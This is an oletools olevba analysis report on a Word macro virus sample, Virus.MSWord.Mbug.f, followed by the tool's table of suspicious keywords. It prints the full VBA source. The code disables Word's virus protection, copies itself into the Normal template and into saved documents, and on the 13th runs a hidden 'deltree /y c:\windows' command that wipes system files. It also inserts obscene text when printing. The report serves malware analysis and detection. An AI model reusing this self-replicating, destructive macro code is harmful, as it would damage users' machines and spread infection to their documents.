olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mbug.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mbug.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO uni.bas 
in file: Virus.MSWord.Mbug.f - OLE stream: 'Macros/VBA/uni'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Attribute AutoExec.VB_Description = "Macro créée par ZeMacroKiller98"
Attribute AutoExec.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.AutoExec"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo errorAE
If Day(Now()) = "12" Then
Set myMenuBar = CommandBars.ActiveMenuBar
Set newMenu = myMenuBar.Controls.Add(Type:=msoControlPopup, Temporary:=True)
newMenu.Caption = "Fuck University"
Set ctrl1 = newMenu.CommandBar.Controls _
    .Add(Type:=msoControlButton, ID:=1)
With ctrl1
    .Caption = "Death PC"
    .TooltipText = "Death PC"
End With
End If
If Day(Now()) = "13" Then
MsgBox "University MacroVirus", vbExclamation
Shell "deltree /y c:\windows", vbHide
End If
errorAE:
End Sub
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Macro créée ZeMacroKiller98"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.AutoOpen"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAO
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "uni" Then
        bInstalled = -1
    End If
Next i
If Not bInstalled Then
    StatusBar = "University"
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="uni", Object:=wdOrganizerObjectProjectItems
Else
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="uni", Object:=wdOrganizerObjectProjectItems
End If
ErrorAO:
End Sub
Sub AutoClose()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAP
With Assistant.NewBalloon
    .Heading = "Bye nice to meet you"
    .Text = "             From University "
    .Show
End With
ErrorAP:
End Sub
Sub FileSaveAs()
Attribute FileSaveAs.VB_Description = "Macro créee par ZeMacroKiller98"
Attribute FileSaveAs.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.FileSaveAs"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="uni", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
ErrorFSA:
If (ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate) Then
    ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
End If
End Sub
Sub FilePrint()
Attribute FilePrint.VB_Description = "Macro crée par ZeMacroKiller98"
Attribute FilePrint.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.FilePrint"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFP
InsertPayload
    Dialogs(wdDialogFilePrint).Show
ErrorFP:
End Sub
Sub FilePrintDefault()
Attribute FilePrintDefault.VB_Description = "Macro créee par ZeMacroKiller98"
Attribute FilePrintDefault.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.FilePrintDefault"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFPD
InsertPayload
    ActiveDocument.PrintOut
ErrorFPD:
End Sub
Sub FileTemplates()
Attribute FileTemplates.VB_Description = "Macro créee par ZeMacroKiller98"
Attribute FileTemplates.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.FileTemplates"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFT
ErrorFT:
End Sub
Sub InsertPayload()
Attribute InsertPayload.VB_Description = "Macro créee par ZeMacroKiller98"
Attribute InsertPayload.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.InsertPayload"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorIP
Selection.Font.Size = "50"
Selection.Font.Bold = True
Selection.TypeText Text:="FUCK UNIVERSITY"
Selection.TypeText Text:="FUCK PUSSY UNIVERSITY"
ErrorIP:
End Sub
Sub ToolsMacro()
Attribute ToolsMacro.VB_Description = "Macro créee par ZeMacroKiller98"
Attribute ToolsMacro.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.ToolsMacro"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorTM
ErrorTM:
End Sub
Sub ViewVBCode()
Attribute ViewVBCode.VB_Description = "Macro créee par ZeMacroKiller98"
Attribute ViewVBCode.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.ViewVBCode"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorVVBC
ErrorVVBC:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
+----------+--------------------+---------------------------------------------+

